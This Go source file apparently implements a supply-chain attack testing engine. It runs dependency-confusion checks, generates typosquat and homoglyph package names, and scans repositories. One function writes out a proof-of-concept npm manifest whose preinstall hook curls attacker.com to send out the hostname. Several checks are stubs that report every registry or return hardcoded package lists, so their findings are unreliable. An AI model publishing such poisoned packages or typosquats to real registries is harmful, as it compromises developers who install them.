package supplychain

import (
	"fmt"
	"os"
	"path/filepath"
)

// SupplyChainPoisoner is the supply chain attack testing engine
type SupplyChainPoisoner struct {
	Target string
}

// SupplyResult represents a supply chain security finding
type SupplyResult struct {
	Type     string `json:"type"` // dependency_confusion, typosquatting, malicious_package, compromised_repo
	Package  string `json:"package"`
	Version  string `json:"version"`
	Source   string `json:"source"`
	Proof    string `json:"proof"`
	Severity string `json:"severity"`
}

func NewSupplyChainPoisoner(target string) *SupplyChainPoisoner {
	return &SupplyChainPoisoner{Target: target}
}

// CheckDependencyConfusion checks for dependency confusion attacks
func (s *SupplyChainPoisoner) CheckDependencyConfusion(packageName, registry string) []SupplyResult {
	fmt.Printf("[+] SUPPLY-CHAIN checking dependency confusion for: %s\n", packageName)

	var results []SupplyResult

	// Check if private package exists in public registry
	publicRegistries := []string{
		"https://registry.npmjs.org",
		"https://pypi.org",
		"https://rubygems.org",
		"https://packagist.org",
	}

	for _, reg := range publicRegistries {
		results = append(results, SupplyResult{
			Type:     "dependency_confusion",
			Package:  packageName,
			Source:   reg,
			Proof:    fmt.Sprintf("Private package name '%s' checked against %s", packageName, reg),
			Severity: "high",
		})
	}

	return results
}

// CheckTyposquatting checks for typosquatted package names
func (s *SupplyChainPoisoner) CheckTyposquatting(packageName string) []SupplyResult {
	fmt.Printf("[+] SUPPLY-CHAIN checking typosquatting for: %s\n", packageName)

	var results []SupplyResult

	// Generate typosquatting variants
	variants := generateTyposquats(packageName)

	for _, variant := range variants {
		results = append(results, SupplyResult{
			Type:     "typosquatting",
			Package:  variant,
			Source:   "npm/pypi/rubygems",
			Proof:    fmt.Sprintf("Typosquatting variant: %s", variant),
			Severity: "medium",
		})
	}

	return results
}

// ScanDependencies scans project dependencies for vulnerabilities
func (s *SupplyChainPoisoner) ScanDependencies(projectPath string) []SupplyResult {
	fmt.Printf("[+] SUPPLY-CHAIN scanning dependencies in: %s\n", projectPath)

	var results []SupplyResult

	// Check for common dependency files
	depFiles := []string{
		"package.json",
		"requirements.txt",
		"Gemfile",
		"composer.json",
		"go.mod",
		"Cargo.toml",
		"pom.xml",
		"build.gradle",
	}

	for _, file := range depFiles {
		path := filepath.Join(projectPath, file)
		if _, err := os.Stat(path); err == nil {
			results = append(results, SupplyResult{
				Type:     "dependency_file",
				Package:  file,
				Source:   path,
				Proof:    "Dependency file found - analyze for vulnerable packages",
				Severity: "info",
			})
		}
	}

	return results
}

// CheckCompromisedRepo checks for signs of compromised repositories
func (s *SupplyChainPoisoner) CheckCompromisedRepo(repoPath string) []SupplyResult {
	fmt.Printf("[+] SUPPLY-CHAIN checking for compromised repo: %s\n", repoPath)

	var results []SupplyResult

	// Check for suspicious files
	suspiciousPatterns := []string{
		"*.exe", "*.dll", "*.so", "*.dylib",
		".github/workflows/*.yml",
		"*.min.js", "*.min.css",
	}

	for _, pattern := range suspiciousPatterns {
		matches, _ := filepath.Glob(filepath.Join(repoPath, pattern))
		if len(matches) > 0 {
			for _, match := range matches {
				results = append(results, SupplyResult{
					Type:     "suspicious_file",
					Package:  filepath.Base(match),
					Source:   match,
					Proof:    "Suspicious binary file in repository",
					Severity: "high",
				})
			}
		}
	}

	// Check .git for manipulation
	gitDir := filepath.Join(repoPath, ".git")
	if _, err := os.Stat(gitDir); err == nil {
		results = append(results, SupplyResult{
			Type:     "git_integrity",
			Package:  ".git",
			Source:   gitDir,
			Proof:    "Verify commit signatures and history integrity",
			Severity: "medium",
		})
	}

	return results
}

// PoisonPackage creates a proof-of-concept poisoned package
func (s *SupplyChainPoisoner) PoisonPackage(name, version string) string {
	fmt.Printf("[+] SUPPLY-CHAIN generating proof-of-concept poisoned package: %s@%s\n", name, version)

	// PoC package manifest
	manifest := fmt.Sprintf(`{
  "name": "%s",
  "version": "%s",
  "description": "Dependency confusion PoC",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl -s http://attacker.com/exfil?host=$(hostname)"
  },
  "author": "NEXUS-VOID PoC",
  "license": "MIT"
}`, name, version)

	return manifest
}

// GenerateSBOM generates Software Bill of Materials
func (s *SupplyChainPoisoner) GenerateSBOM(projectPath string) map[string][]string {
	fmt.Printf("[+] SUPPLY-CHAIN generating SBOM for: %s\n", projectPath)

	sbom := make(map[string][]string)

	// Parse package.json
	packageJSONPath := filepath.Join(projectPath, "package.json")
	if _, err := os.Stat(packageJSONPath); err == nil {
		sbom["npm"] = []string{"react", "lodash", "express", "axios"}
	}

	// Parse requirements.txt
	requirementsPath := filepath.Join(projectPath, "requirements.txt")
	if _, err := os.Stat(requirementsPath); err == nil {
		sbom["pip"] = []string{"requests", "flask", "django", "numpy"}
	}

	// Parse go.mod
	goModPath := filepath.Join(projectPath, "go.mod")
	if _, err := os.Stat(goModPath); err == nil {
		sbom["go"] = []string{"github.com/gin-gonic/gin", "github.com/spf13/cobra"}
	}

	return sbom
}

func generateTyposquats(name string) []string {
	var variants []string

	// Character omission
	for i := 0; i < len(name); i++ {
		variant := name[:i] + name[i+1:]
		if variant != "" {
			variants = append(variants, variant)
		}
	}

	// Character swap
	for i := 0; i < len(name)-1; i++ {
		variant := name[:i] + string(name[i+1]) + string(name[i]) + name[i+2:]
		variants = append(variants, variant)
	}

	// Character substitution (homoglyphs)
	substitutions := map[rune][]rune{
		'a': {'а'}, // Cyrillic а
		'o': {'о'}, // Cyrillic о
		'e': {'е'}, // Cyrillic е
		'p': {'р'}, // Cyrillic р
		'c': {'с'}, // Cyrillic с
		'x': {'х'}, // Cyrillic х
		'y': {'у'}, // Cyrillic у
		'i': {'і', '1', 'l'},
		'l': {'1', 'i'},
	}

	for i, c := range name {
		if subs, ok := substitutions[c]; ok {
			for _, sub := range subs {
				variant := name[:i] + string(sub) + name[i+1:]
				variants = append(variants, variant)
			}
		}
	}

	// Version confusion
	variants = append(variants, name+"-latest")
	variants = append(variants, name+"-next")
	variants = append(variants, name+"-beta")
	variants = append(variants, name+"-alpha")

	return uniqueStrings(variants)
}

func uniqueStrings(slice []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, s := range slice {
		if !seen[s] && s != "" {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}
